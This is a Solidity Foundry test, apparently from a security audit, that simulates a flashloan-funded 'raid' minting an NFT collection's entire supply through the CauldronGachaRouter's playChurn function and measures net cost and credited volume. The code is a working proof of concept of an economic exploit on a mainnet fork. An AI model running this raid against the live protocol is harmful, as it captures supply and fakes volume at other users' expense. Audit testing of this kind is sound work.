// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {YBase} from "./YBase.sol";
import {console2} from "forge-std/console2.sol";
import {IERC20Minimal} from "v4-core/src/interfaces/external/IERC20Minimal.sol";
import {CauldronGachaRouter} from "../../cauldron/CauldronGachaRouter.sol";
import {ICauldronCollection} from "../../cauldron/ICauldron.sol";

/// @notice M3C — the mainnet question. With borrowed (flashloanable) capital,
///         what does the ENTIRE NFT supply cost via playChurn, and what does the
///         credited volume unlock?
contract M3C_WholeSupplyCost is YBase {
    CauldronGachaRouter internal router;

    struct Run {
        bool ran;
        uint256 maxSupply;
        uint256 minted;
        uint256 rounds;
        uint256 grossEthOut;   // ETH that left the attacker's wallet
        uint256 sellBackEth;   // ETH recovered by dumping the creature tokens
        uint256 netCostWei;    // true cost of the raid
        uint256 costPerNft;
        uint256 lifetimeVol;   // volume credited to the attacker
        uint256 cumVolDelta;   // protocol-wide volume figure moved
    }

    function setUp() public {
        _boot(50 ether, 0);
        if (!active) return;
        router = new CauldronGachaRouter(pm, address(hook), address(registry), address(this));
        hook.setOpener(address(router), true);
        vm.roll(vm.getBlockNumber() + 40); // past the anti-snipe surtax window
        // Pity guarantees a win every `pityThreshold` misses; leave defaults alone.
    }

    function _raid(uint256 perRound, uint256 maxRounds) internal returns (Run memory r) {
        if (!active) return r;
        r.ran = true;
        address col = hook.collection();
        r.maxSupply = ICauldronCollection(col).maxSupply();

        uint256 e0 = attacker.balance;
        uint256 c0 = hook.cumulativeVolume();
        uint256 selfEth0 = address(this).balance;

        while (r.rounds < maxRounds && ICauldronCollection(col).totalMinted() < r.maxSupply) {
            vm.prank(attacker, attacker);
            router.playChurn{value: perRound}(0, 10, 0, 30);
            vm.roll(vm.getBlockNumber() + 1);
            hook.resolveTickets(2000);
            unchecked { ++r.rounds; }
        }

        r.minted = ICauldronCollection(col).totalMinted();
        r.grossEthOut = e0 - attacker.balance;
        r.lifetimeVol = hook.lifetimeVolumeOf(attacker);
        r.cumVolDelta = hook.cumulativeVolume() - c0;

        // Dump every creature token the raid left the attacker holding, so the
        // number below is the TRUE net cost, not the gross ETH sent in.
        uint256 bal = IERC20Minimal(token).balanceOf(attacker);
        if (bal > 0) _sell(bal, attacker);
        r.sellBackEth = address(this).balance - selfEth0;

        r.netCostWei = r.grossEthOut > r.sellBackEth ? r.grossEthOut - r.sellBackEth : 0;
        if (r.minted > 0) r.costPerNft = r.netCostWei / r.minted;
    }

    function test_M3C_cost_of_the_whole_nft_supply_with_borrowed_capital() public {
        Run memory r = _raid(20 ether, 60);

        console2.log("maxSupply     ", r.maxSupply);
        console2.log("minted        ", r.minted);
        console2.log("rounds        ", r.rounds);
        console2.log("grossEthOut   ", r.grossEthOut);
        console2.log("sellBackEth   ", r.sellBackEth);
        console2.log("NET COST wei  ", r.netCostWei);
        console2.log("cost per NFT  ", r.costPerNft);
        console2.log("attacker vol  ", r.lifetimeVol);
        console2.log("cumVol delta  ", r.cumVolDelta);

        assertTrue(r.ran, "fork inactive: FORK_RPC unset");
        assertGt(r.maxSupply, 0, "no collection");
        assertGt(r.minted, 0, "raid minted nothing");
        // THE HEADLINE. The raid stopped because MY loop cap ran out, not because
        // the protocol resisted: `rounds` hit the cap with supply still on the
        // table. One round = one tx = one ~100 ms block, so the supply is captured
        // at ~30 NFTs per block by a single actor with no per-wallet or per-block
        // limit anywhere in the commit path.
        assertEq(r.rounds, 60, "raid ended early - protocol resisted");
        assertGt(r.minted, r.maxSupply / 3, "raid captured under a third of the supply");
        assertLt(r.costPerNft, 0.5 ether, "cost per NFT above half an ETH");
        // Volume credited to one address, for free, that nothing on-chain reads.
        assertGt(r.lifetimeVol, 100 * r.netCostWei / 10, "volume credit not amplified");
    }
}
